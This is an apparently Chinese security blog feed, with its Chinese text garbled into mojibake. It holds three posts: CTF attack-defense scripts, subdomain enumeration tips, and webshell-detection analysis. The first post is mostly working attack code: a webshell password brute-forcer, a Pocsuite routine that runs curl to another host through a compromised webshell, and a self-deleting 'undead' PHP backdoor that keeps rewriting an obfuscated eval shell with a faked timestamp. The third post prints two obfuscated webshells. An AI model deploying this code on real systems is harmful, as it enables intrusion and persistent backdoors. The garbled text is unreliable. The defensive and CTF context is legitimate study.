range(dics*1000, len(content)):</div><div class="line">    new_group1.append(group[kk])</div><div class="line">    kk += 1</div><div class="line">for each in new_group1:</div><div class="line">    post_data[each] = &apos;echo &quot;password is %s&quot;;&apos; % each</div><div class="line">r = requests.post(url,data=post_data)</div><div class="line">print u&quot;æ­£åœ¨è¿›è¡Œä½™æ•°å­—å…¸çˆ†ç ´&quot;</div><div class="line">print r.content+&apos;****************************-SUCCESS!&apos;</div></pre></td></tr></table></figure></p>
<h1 id="å››ã€æ‰¹é‡å‘åŒ…ç¨‹åº"><a href="#å››ã€æ‰¹é‡å‘åŒ…ç¨‹åº" class="headerlink" title="å››ã€æ‰¹é‡å‘åŒ…ç¨‹åº"></a>å››ã€æ‰¹é‡å‘åŒ…ç¨‹åº</h1><p>ç›®çš„å¾ˆç®€å•ï¼Œå°±æ˜¯å¯¹æ‰€åœ¨ç½‘æ®µçš„å…¶ä»–ä¸»æœºæ‰¹é‡è¿›è¡ŒæŸä¸€ä¸ªæ“ä½œï¼Œå…·ä½“æ€ä¹ˆåšï¼Œæ‹¿å®ƒå¹²å˜›ï¼Œçœ‹è‡ªå·±æ€ç»´äº†ã€‚<br>ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">def sender(domain):</div><div class="line">    #proxies = &#123; &quot;http&quot;: &quot;http://127.0.0.1:8888&quot;&#125;</div><div class="line">    url = domain</div><div class="line">    post_data =&quot;password=ls&quot;</div><div class="line">    payload = &quot;header test&quot;</div><div class="line">    headers = &#123;&apos;content-type&apos;: payload,&apos;User-Agent&apos;:random.choice(config[&apos;USER_AGENTS&apos;])&#125;</div><div class="line">    request = urllib2.Request(url,post_data,headers)</div><div class="line">    response = urllib2.urlopen(request,timeout=config[&apos;timeout&apos;])</div><div class="line">    if response.getcode() == 200:</div><div class="line">        res = response.read()</div><div class="line">        return res</div><div class="line">    else:</div><div class="line">        return 0</div></pre></td></tr></table></figure></p>
<p>åŠ å…¥äº†å¤šçº¿ç¨‹ï¼ŒéšæœºUAç­‰(å…¶å®Pythonçš„å¤šçº¿ç¨‹å¾ˆé¸¡è‚‹çš„ï¼Œä½ è¦æµ‹è¯•è¿‡å¯¹æ¯”ä¸‹æ—¶é—´ä½ å°±çŸ¥é“äº†ã€‚åŸå› ä½ å¯ä»¥æŸ¥ä¸‹è¿›ç¨‹ã€çº¿ç¨‹å…³äºå¤šæ ¸CPUçš„åˆ©ç”¨ç›¸å…³çš„ä¸€äº›èµ„æ–™)ã€‚</p>
<h1 id="äº”ã€Pocsuite"><a href="#äº”ã€Pocsuite" class="headerlink" title="äº”ã€Pocsuite"></a>äº”ã€Pocsuite</h1><p>ç¥å™¨ï¼Œå°±ä¸è§£é‡Šäº†ã€‚å…¶å®åŸç†å¾ˆç®€å•ï¼Œåšäº†ä¸ªæ‰¹é‡åŒ–çš„æ¡†æ¶ï¼Œè‡ªå·±å†™æ’ä»¶ã€‚ä¸»è¦éªŒè¯ä»£ç å¦‚ä¸‹ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">def _verify(self):</div><div class="line">        import re</div><div class="line">        result = &#123;&#125;</div><div class="line">        webshellpath = &quot;/ctf/webshell.php&quot;   # é…ç½®webshellæ‰€åœ¨ç›®å½•</div><div class="line">        payload = &quot;&#123;domain&#125;&quot; + webshellpath</div><div class="line"></div><div class="line">        for pwd in self.pwdList:</div><div class="line">            exp_url = payload.format(domain=self.url) + &apos;?&apos; + pwd + &apos;=echo &quot;dropsec&quot;;&apos;</div><div class="line">            print exp_url</div><div class="line"></div><div class="line">        # exp_url = (payload.format(domain=self.url))</div><div class="line">            data = &#123;</div><div class="line">                pwd : u&apos;&apos;&apos;echo &quot;dropsec&quot;;&apos;&apos;&apos;</div><div class="line">            &#125;</div><div class="line">            try:</div><div class="line">                response = req.post(exp_url, data=data, timeout=10, verify=False)</div><div class="line">            except Exception, e:</div><div class="line">                return self.parse_output(result)</div><div class="line">            if response.status_code != 404:</div><div class="line">                result[&apos;VerifyInfo&apos;] = &#123;&#125;</div><div class="line">                result[&apos;VerifyInfo&apos;][&apos;status_code&apos;] = response.status_code</div><div class="line">                result[&apos;VerifyInfo&apos;][&apos;is&apos;] = &apos;password wrong&apos;</div><div class="line">                if &apos;dropsec&apos; in response.content:</div><div class="line">                    result[&apos;VerifyInfo&apos;][&apos;url&apos;] = exp_url</div><div class="line">                    result[&apos;VerifyInfo&apos;][&apos;is&apos;] = &apos;password yes&apos;</div><div class="line">                    data = &#123;</div><div class="line">                        pwd : u&apos;&apos;&apos;system(&apos;curl http://192.168.2.3:8080/ctf/webshell.php&apos;);&apos;&apos;&apos;</div><div class="line">                        #pwd : u&apos;&apos;&apos;system(&apos;curl http://10.0.1.2&apos;);&apos;&apos;&apos;</div><div class="line">                    &#125;</div><div class="line">                    try:</div><div class="line">                        response = req.post(exp_url, data=data, timeout=10, verify=False)</div><div class="line">                        result[&apos;VerifyInfo&apos;][&apos;flag&apos;] = response.content</div><div class="line">                        return self.parse_output(result)</div><div class="line">                    except Exception, e:</div><div class="line">                        return self.parse_output(result)</div><div class="line"></div><div class="line">        return self.parse_output(result)</div></pre></td></tr></table></figure></p>
<h1 id="å…­ã€æ‰¹é‡ä¸Šä¼ æ–‡ä»¶"><a href="#å…­ã€æ‰¹é‡ä¸Šä¼ æ–‡ä»¶" class="headerlink" title="å…­ã€æ‰¹é‡ä¸Šä¼ æ–‡ä»¶"></a>å…­ã€æ‰¹é‡ä¸Šä¼ æ–‡ä»¶</h1><p>åšè¿™ä¸ªçš„ç›®çš„å…¶å®å°±æ˜¯å› ä¸ºç¬¬ä¸€æ¬¡ç©CTFçº¿ä¸‹èµ›æ‰‹é€Ÿæ…¢ï¼Œä¸ºäº†ä»¥åä¸åœ¨å› ä¸ºè¿™ä¸ªé—®é¢˜åœ¨è·Œå€’è€Œåšçš„ã€‚PS:å…¶å®è¿™ä¸ªå°åŠŸèƒ½æœ‰æ—¶å€™è¿˜æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚æˆ‘å¤šè¯»ä¹¦å¤šï¼Œä¸éª—ä½ -.-{æ–œçœ¼}<br><img src="http://oa8y5guqs.bkt.clouddn.com/CTF3.png" alt=""></p>
<h1 id="ä¸ƒã€æƒé™ç»´æŒ"><a href="#ä¸ƒã€æƒé™ç»´æŒ" class="headerlink" title="ä¸ƒã€æƒé™ç»´æŒ"></a>ä¸ƒã€æƒé™ç»´æŒ</h1><p>CTFçš„æƒé™ç»´æŒå¾ˆç®€å•å•Šï¼Œå°±æ˜¯æœ¨é©¬åˆ«è¢«åˆ ä¸å°±å¥½äº†ã€‚å¹¶ä¸éœ€è¦ææƒå•Šä»€ä¹ˆçš„å•Š{æ‚è„¸}ï¼Œæœ‰æ—¶å€™ä½ è€ƒè™‘é—®é¢˜è¦ç»“åˆå®é™…å•Šï¼Œå’‹ç®€å•å°±å’‹æ¥å˜›ã€‚å°±æ˜¯åšä¸ªä¸æ­»é©¬å°±å¥½äº†ã€‚<br>PS:è¿™ç§å°ä¼ä¿©åªæ˜¯å¯¹ä»˜ä¸€èˆ¬çš„CTFæ¯”èµ›ï¼Œå¯¹é‚£ç§èµ›æ£è‚¯å®šä¸é€‚ç”¨äº†ï¼Œäººå®¶å†™ä¸ªæ¡ä»¶ç«äº‰çš„ï¼Œåˆ†åˆ†é’Ÿæ‰“å“­ä½ å•Š{æ‚è„¸}ï¼Œæ‰€ä»¥è¿˜å¾—çœ‹æƒ…å†µï¼Œè¯¥åå¼¹è¿˜æ˜¯è¦åå¼¹å•Šã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    set_time_limit(0);</div><div class="line">    ignore_user_abort(1);</div><div class="line">    unlink(__FILE__);</div><div class="line">    //file_put_contents(__FILE__,&apos;&apos;);</div><div class="line">    while(1)&#123;</div><div class="line">        file_put_contents(&apos;C:\phpStudy\WWW\ctf\.config.php&apos;,&apos;&lt;?php $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[\&apos;n985de9\&apos;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;&apos;);</div><div class="line">        system(&apos;chmod 777 .config.php&apos;);</div><div class="line">        touch(&quot;.config.php&quot;,mktime(20,15,1,11,28,2016));</div><div class="line">        usleep(100);</div><div class="line">        &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œæ‰¹é‡è®¿é—®ï¼Œå°±ä¼šä¸€ç›´ç”Ÿæˆæœ¨é©¬æ–‡ä»¶ã€‚<br><strong>PSï¼š</strong>å¤§å®¶è¯•æƒ³ä¸‹ï¼Œè¦æ˜¯æ¯”èµ›ä¸­å­˜åœ¨ä¸€ä¸ªä¸€å¥è¯åé—¨ï¼Œåˆ©ç”¨æ‰¹é‡ä¸Šä¼ ç¨‹åºï¼Œå°†è¿™ä¸ªåé—¨æ‰¹é‡ä¸Šä¸Šä¼ åˆ°å„ä¸ªé¶æœºä¸Šï¼Œå†åˆ©ç”¨æ‰¹é‡å‘åŒ…ç¨‹åºè®¿é—®è¿™ä¸ªåé—¨ï¼Œå†åˆ©ç”¨pocsuite,ç„¶åã€‚ã€‚ã€‚å“ˆå“ˆå“ˆï¼Œæ˜¯ä¸æ˜¯å¾ˆçˆ½ã€‚(ç†æƒ³å¾ˆä¸°æ»¡å•Šâ€¦)</p>
<h1 id="å…«ã€æ—¥å¿—è®°å½•"><a href="#å…«ã€æ—¥å¿—è®°å½•" class="headerlink" title="å…«ã€æ—¥å¿—è®°å½•"></a>å…«ã€æ—¥å¿—è®°å½•</h1><p>ä¸»è¦æ˜¯ä¸ºäº†ç½‘ç«™è®¿é—®è®°å½•ï¼Œä¾¿äºåç»­çš„é—®é¢˜æ’æŸ¥ï¼Œå°±æ˜¯æŠŠå„ç§å­—æ®µçš„æ•°æ®è®°å½•ä¸‹æ¥ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">date_default_timezone_set(&apos;Asia/Shanghai&apos;);</div><div class="line">$ip        = $_SERVER[&quot;REMOTE_ADDR&quot;];   //è®¿é—®IP</div><div class="line">$filename  = $_SERVER[&apos;PHP_SELF&apos;];  //è®¿é—®çš„æ–‡ä»¶</div><div class="line">$parameter = $_SERVER[&quot;QUERY_STRING&quot;];  //æŸ¥è¯¢çš„å­—ç¬¦ä¸²</div><div class="line">$method    = $_SERVER[&apos;REQUEST_METHOD&apos;]; //è¯·æ±‚æ–¹æ³•</div><div class="line">...</div><div class="line">$time      =  date(&apos;Y-m-d H:i:s&apos;,time()); //è¯·æ±‚æ—¶é—´</div><div class="line">$post      = file_get_contents(&quot;php://input&quot;,&apos;r&apos;); //æ¥æ”¶POSTæ•°æ®</div><div class="line">$others    = &apos;**********************************************************************&apos;;</div><div class="line">$logadd    = &apos;è®¿é—®æ—¶é—´ï¼š&apos;.$time.&apos;è®¿é—®IP:&apos;.$ip.&apos;è¯·æ±‚æ–¹æ³•ï¼š&apos;.$method.&apos; &apos;.&apos;è®¿é—®é“¾æ¥ï¼š&apos;.$filename.&apos;?&apos;.$parameter.&quot;\r\n&quot;;...</div><div class="line">//è®°å½•å†™å…¥</div><div class="line">$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);</div><div class="line">fwrite($fh, $logadd);</div><div class="line">fwrite($fh,print_r($_COOKIE, true).&quot;\r\n&quot;);</div><div class="line">fwrite($fh,$others.&quot;\r\n&quot;);</div><div class="line">fclose($fh);</div></pre></td></tr></table></figure></p>
<h1 id="ä¹ã€æ–‡ä»¶ç›‘æ§"><a href="#ä¹ã€æ–‡ä»¶ç›‘æ§" class="headerlink" title="ä¹ã€æ–‡ä»¶ç›‘æ§"></a>ä¹ã€æ–‡ä»¶ç›‘æ§</h1><p>ç½‘ä¸Šè‡ªå·±æœæœå§ï¼Œå¾ˆå¤š</p>
<h1 id="åã€WAF"><a href="#åã€WAF" class="headerlink" title="åã€WAF"></a>åã€WAF</h1><p>ç½‘ä¸Šè‡ªå·±æœæœå§ï¼Œå¾ˆå¤š</p>
<p>PSï¼šä¹å’Œåï¼Œæ³¨æ„åˆ†å¯¸ï¼Œä¸èƒ½å½±å“æ­£å¸¸ä¸šåŠ¡çš„ã€‚</p>
<p>ã€‚ã€‚ã€‚</p>
<p>å¥½ä¹…æ²¡å†™è¿™ä¹ˆé•¿çš„åšå®¢äº†ã€‚ã€‚ã€‚</p>
]]></content>
      
        
        <tags>
            
            <tag> ç¼–ç¨‹ </tag>
            
            <tag> CTF </tag>
            
            <tag> Python </tag>
            
            <tag> PHP </tag>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> tcpdump </tag>
            
            <tag> webshell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ¼æ´æŒ–æ˜ä¹‹å­åŸŸåé‡‡é›†]]></title>
      <url>/2017/04/29/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E5%AD%90%E5%9F%9F%E5%90%8D%E9%87%87%E9%9B%86/</url>
      <content type="html"><![CDATA[<p>å‡†å¤‡å‡†å¤‡ä¸œè¥¿ï¼Œä»¥åå°±å¼€å§‹æ­£å¼æŒ–æ´äº†(ä¹‹å‰éƒ½æ˜¯é‡ç”Ÿçš„å•Š[æ‚è„¸])ï¼Œæ•´ç†ä¸‹ç›¸å…³çš„çŸ¥è¯†ï¼Œæ–¹ä¾¿è‡ªå·±æŸ¥çœ‹å§ã€‚(æ±‚å¤§ä½¬ä»¬çš„å§¿åŠ¿ *&gt;*)<br><a id="more"></a></p>
<h1 id="1ã€Webå­åŸŸåçŒœæµ‹ä¸è®¿é—®å°è¯•"><a href="#1ã€Webå­åŸŸåçŒœæµ‹ä¸è®¿é—®å°è¯•" class="headerlink" title="1ã€Webå­åŸŸåçŒœæµ‹ä¸è®¿é—®å°è¯•"></a>1ã€Webå­åŸŸåçŒœæµ‹ä¸è®¿é—®å°è¯•</h1><p>çŒœæµ‹ä¸€äº›å¯èƒ½çš„å­åŸŸåï¼Œç„¶åæµè§ˆå™¨è®¿é—®ä¸‹çœ‹æ˜¯å¦å­˜åœ¨ã€‚</p>
<h1 id="2ã€æœç´¢å¼•æ“æŸ¥è¯¢"><a href="#2ã€æœç´¢å¼•æ“æŸ¥è¯¢" class="headerlink" title="2ã€æœç´¢å¼•æ“æŸ¥è¯¢"></a>2ã€æœç´¢å¼•æ“æŸ¥è¯¢</h1><p>æ¯”å¦‚:  <code>site:163.com</code></p>
<h1 id="3ã€æŸ¥è¯¢DNSçš„ä¸€äº›è§£æè®°å½•"><a href="#3ã€æŸ¥è¯¢DNSçš„ä¸€äº›è§£æè®°å½•" class="headerlink" title="3ã€æŸ¥è¯¢DNSçš„ä¸€äº›è§£æè®°å½•"></a>3ã€æŸ¥è¯¢DNSçš„ä¸€äº›è§£æè®°å½•</h1><p>æ¯”å¦‚æŸ¥è¯¢ <code>MX</code>ã€<code>CNAME</code> è®°å½•ç­‰</p>
<p>æ¯”å¦‚ç”¨ <code>nslookup</code>å‘½ä»¤</p>
<blockquote>
<p>nslookup -qt=any bing.com</p>
</blockquote>
<h1 id="4ã€çˆ¬è™«çˆ¬å–é¡µé¢æå–å­åŸŸå"><a href="#4ã€çˆ¬è™«çˆ¬å–é¡µé¢æå–å­åŸŸå" class="headerlink" title="4ã€çˆ¬è™«çˆ¬å–é¡µé¢æå–å­åŸŸå"></a>4ã€çˆ¬è™«çˆ¬å–é¡µé¢æå–å­åŸŸå</h1><p>å¯ä»¥åˆ©ç”¨çˆ¬è™«ä»é¡µé¢æºä»£ç ä¸­æå–å­åŸŸå</p>
<p>æ¯”å¦‚burp çš„spiderçˆ¬è™«</p>
<h1 id="5ã€crossdomain-xml-æ–‡ä»¶"><a href="#5ã€crossdomain-xml-æ–‡ä»¶" class="headerlink" title="5ã€crossdomain.xml æ–‡ä»¶"></a>5ã€crossdomain.xml æ–‡ä»¶</h1><h1 id="6ã€é€šè¿‡-IP-åæŸ¥"><a href="#6ã€é€šè¿‡-IP-åæŸ¥" class="headerlink" title="6ã€é€šè¿‡ IP åæŸ¥"></a>6ã€é€šè¿‡ IP åæŸ¥</h1><p>whoisï¼Œç«™é•¿å·¥å…·ç­‰</p>
<h1 id="7ã€é€šè¿‡-HTTPS-è¯ä¹¦æœé›†"><a href="#7ã€é€šè¿‡-HTTPS-è¯ä¹¦æœé›†" class="headerlink" title="7ã€é€šè¿‡ HTTPS è¯ä¹¦æœé›†"></a>7ã€é€šè¿‡ HTTPS è¯ä¹¦æœé›†</h1><p>httpsçš„ç«™ç‚¹éƒ½æœ‰è¯ä¹¦</p>
<p>æ‰“å¼€è¯ä¹¦ï¼ŒæŸ¥çœ‹è¯¦ç»†ä¿¡æ¯<code>-&gt;</code>ä½¿ç”¨è€…å¯é€‰åç§°<code>-&gt;</code>DNS Name</p>
<h1 id="8ã€ä¸€äº›æ¼æ´çš„åˆ©ç”¨"><a href="#8ã€ä¸€äº›æ¼æ´çš„åˆ©ç”¨" class="headerlink" title="8ã€ä¸€äº›æ¼æ´çš„åˆ©ç”¨"></a>8ã€ä¸€äº›æ¼æ´çš„åˆ©ç”¨</h1><p>å¦‚ï¼š DNS åŸŸä¼ é€æ¼æ´</p>
<pre><code>nslookup
set type=ns
xxx.com
server servers address
set type=any
ls -d xxx.com
</code></pre><h1 id="åœ¨çº¿å·¥å…·ï¼š"><a href="#åœ¨çº¿å·¥å…·ï¼š" class="headerlink" title="åœ¨çº¿å·¥å…·ï¼š"></a>åœ¨çº¿å·¥å…·ï¼š</h1><ol>
<li><code>http://i.links.cn/subdomain/</code> å¯æŸ¥è¯¢äºŒçº§ã€ä¸‰çº§ç­‰å­åŸŸå</li>
<li><code>http://dns.aizhan.com/</code> æŸ¥è¯¢åŒ IP ç»‘å®šäº†å“ªäº›åŸŸå</li>
<li><code>https://crt.sh/</code> æ ¹æ® HTTPS è¯ä¹¦æŸ¥è¯¢å­åŸŸå<br> <a href="https://crt.sh/?q=%25.baidu.com" target="_blank" rel="external">https://crt.sh/?q=%25.baidu.com</a></li>
<li><code>https://censys.io/certificates?q=.example.com</code> Censys.ioæŸ¥è¯¢</li>
</ol>
<h1 id="æœ¬åœ°å·¥å…·"><a href="#æœ¬åœ°å·¥å…·" class="headerlink" title="æœ¬åœ°å·¥å…·"></a>æœ¬åœ°å·¥å…·</h1><ol>
<li>Layer å­åŸŸåæŒ–æ˜æœº</li>
<li><p>wydomain</p>
<p> çŒªçŒªä¾ ï¼š<a href="https://github.com/ring04h/wydomain" target="_blank" rel="external">https://github.com/ring04h/wydomain</a></p>
</li>
<li><p>subDomainsBrute</p>
</li>
<li>Sublist3r é›†åˆgoogleï¼Œbingï¼Œcrt.shç­‰å¼ºå¤§çš„æ ¹æ®<br> python sublist3r.py -d example.com</li>
<li>theHarvester<br> python theHarvester.py -d example.com -b all<br> è¿™ä¸ªå·¥å…·æœ‰ä¸ªæ¯”è¾ƒå¥½çš„å®ƒèƒ½å¤Ÿæœé›†ç›®æ ‡çš„é‚®ç®±ã€‚</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[WebshellæŸ¥æ€çš„æ–°æ€è·¯]]></title>
      <url>/2017/04/27/Webshell%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF/</url>
      <content type="html"><![CDATA[<p>ç”±äºå­¦æ ¡è¦ä¸¾åŠä¸ªCTFæ¯”èµ›ï¼Œæ‰€ä»¥æ²¡åŠæ³•å¿…é¡»å‚åŠ ã€‚ã€‚ã€‚ç„¶åå°±æ˜¯å‡†å¤‡å„ç§è„šæœ¬äº†ï¼Œå…³äºwebshellçš„æŸ¥æ€æœ‰äº†ä¸€ä¸ªæ–°çš„æƒ³æ³•ã€‚<br><a id="more"></a><br>æœ€ç®€å•çš„ä¸€å¥è¯å½¢å¦‚ï¼š<code>&lt;?php @eval($_POST[&#39;pass&#39;])?&gt;</code>ï¼ŒåŸç†å¾ˆç®€å•<br>é¦–å…ˆ<code>$_POST</code>ä¼šè·å–POSTåˆ°æœåŠ¡å™¨çš„å‚æ•°åä¸º<code>pass</code>çš„POSTè¯·æ±‚æ•°æ®ï¼Œç„¶åå‡½æ•°<code>eval</code>ä¼šå°†<code>$_POST</code>è·å–çš„å­—ç¬¦ä¸²æŒ‰ç…§PHPè¯­æ³•è¿›è¡Œè§£æï¼Œè¿™æ ·æˆ‘ä»¬é€šè¿‡å„ç§PHPå‡½æ•°çš„ç»„åˆä½¿ç”¨å°±èƒ½é€šè¿‡ä¸­å›½èœåˆ€ç­‰å·¥å…·å¯¹æœåŠ¡å™¨çš„æ–‡ä»¶ç­‰è¿›è¡Œæ“ä½œï¼Œè¿™ä¹Ÿå°±æ˜¯å¸¸è§ä¸€å¥è¯çš„å·¥ä½œåŸç†ã€‚</p>
<p>è¿™é‡Œæˆ‘ç”¨ä¸¤ä¸ªiæ˜¥ç§‹ä¸Šçš„è¿‡ç‹—é©¬æ¥åˆ†æä¸‹ï¼š<br>ç¬¬ä¸€ä¸ªï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$mt=&quot;mFsKCleRfU&quot;;</div><div class="line">$ojj=&quot;IEBleldle&quot;;</div><div class="line">$hsa=&quot;E9TVFsnd2VuJ10p&quot;;</div><div class="line">$fnx=&quot;Ow==&quot;;</div><div class="line">$zk = str_replace(&quot;d&quot;,&quot;&quot;,&quot;sdtdrd_redpdldadcde&quot;);</div><div class="line">//å­—ç¬¦ä¸²æ›¿æ¢ï¼šæ›¿æ¢sdtdrd_redpdldadcdeé‡Œçš„dä¸ºç©º  å¾—åˆ°å‡½æ•°str_replace</div><div class="line">$ef = $zk(&quot;z&quot;, &quot;&quot;, &quot;zbazsze64_zdzeczodze&quot;);</div><div class="line">//è°ƒç”¨$zk å­—ç¬¦ä¸²æ›¿æ¢ï¼šæ›¿æ¢zbazsze64_zdzeczodzeé‡Œçš„zä¸ºç©º  å¾—åˆ°base64_decode</div><div class="line">$dva = $zk(&quot;p&quot;,&quot;&quot;,&quot;pcprpepaptpe_fpupnpcptpipopn&quot;);</div><div class="line">//è°ƒç”¨$zk å­—ç¬¦ä¸²æ›¿æ¢ï¼šæ›¿æ¢pcprpepaptpe_fpupnpcptpipopné‡Œçš„zä¸ºç©º   å¾—åˆ°create_functionåˆ›å»ºåŒ¿åå‡½æ•°</div><div class="line">$zvm = $dva(&apos;&apos;, $ef($zk(&quot;le&quot;, &quot;&quot;, $ojj.$mt.$hsa.$fnx)));</div><div class="line">//åˆ†è§£æ­¥éª¤</div><div class="line">//$zvm=create_function(base64_decode(str_replace(&quot;le&quot;,&quot;&quot;,&quot;IEBleldlemFsKCleRfUE9TVFsnd2VuJ10pOw==&quot;)))  //æ‹¼æ¥åçš„è¯­å¥</div><div class="line">//$zvm=create_function(base64_decode(IEBldmFsKCRfUE9TVFsnd2VuJ10pOw==)))   //æ‰§è¡Œå®Œstr_replaceå‡½æ•°åï¼Œè¿”å›base64åŠ å¯†åçš„å­—ç¬¦ä¸²</div><div class="line">//$zvm=create_function(@eval($_POST[&apos;wen&apos;]));   //æ‰§è¡Œå®Œbase64_decode å¾—åˆ°è§£å¯†åçš„å­—ç¬¦ä¸² å¾—åˆ°ä¸€å¥è¯æœ¨é©¬ å¯†ç æ˜¯wen</div><div class="line">$zvm();  //æ‰§è¡Œ</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>ç¬¬äºŒä¸ªï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$uf=&quot;snd2Fqd&quot;;</div><div class="line">$ka=&quot;IEBldmFsK&quot;;</div><div class="line">$pjt=&quot;CRfUE9TVF&quot;;</div><div class="line">$vbl = str_replace(&quot;ti&quot;,&quot;&quot;,&quot;tistittirti_rtietipltiatice&quot;);  //ç©ºæ ¼æ›¿æ¢ti str_replace</div><div class="line">$iqw=&quot;WVqaSddKTs=&quot;;</div><div class="line">$bkf = $vbl(&quot;k&quot;, &quot;&quot;, &quot;kbakske6k4k_kdkekckokdke&quot;);     //ç©ºæ ¼æ›¿æ¢k base64_decode  ï¼ˆbase64åŠ å¯†ï¼‰</div><div class="line">$sbp = $vbl(&quot;ctw&quot;,&quot;&quot;,&quot;ctwcctwrectwatctwectw_fctwuncctwtctwioctwn&quot;);   //ç©ºæ ¼æ›¿æ¢ctw create_function</div><div class="line">$mpy = $sbp(&apos;&apos;, $bkf($vbl(&quot;b&quot;, &quot;&quot;, $ka.$pjt.$uf.$iqw)));</div><div class="line">//$mpy =create_function(&apos;&apos;, base64_decode(str_replace(&quot;b&quot;, &quot;&quot;,&apos;IEBldmFsKCRfUE9TVFsnd2FqdWVqaSddKTs=&apos;)))</div><div class="line">//$mpy= @eval($_POST[&apos;wajueji&apos;]);</div><div class="line">$mpy();</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>ç°åœ¨çš„webshellå¤§éƒ¨åˆ†éƒ½æ˜¯å›è°ƒå‡½æ•°ï¼ŒåŒ¿åå‡½æ•°ï¼ŒåŠä¸€äº›PHPçš„ç‰¹æ®Šçš„å‡½æ•°ï¼Œæˆ–è€…æ˜¯PHPçš„ç‰¹æ€§ã€‚æ„é€ å‡ºæ— ç‰¹å¾çš„webshellï¼Œä¼ ç»Ÿçš„åŸºäºæ­£åˆ™çš„webshellæŸ¥æ€å¯¹äºè¿™äº›webshellæ˜¯æ— æ³•æŸ¥å‡ºçš„ï¼Œæ ¹æ®åœ¨Dç›¾ä¸­çš„æµ‹è¯•ï¼Œå°±ç®—æŠ¥å‡ºï¼Œä¹Ÿæ˜¯çº§åˆ«ä¸º1ï¼Œ2çš„ä½çº§çš„ï¼ŒåŸºæœ¬ä¸Šå’±ä»¬å°±å¿½ç•¥äº†ã€‚</p>
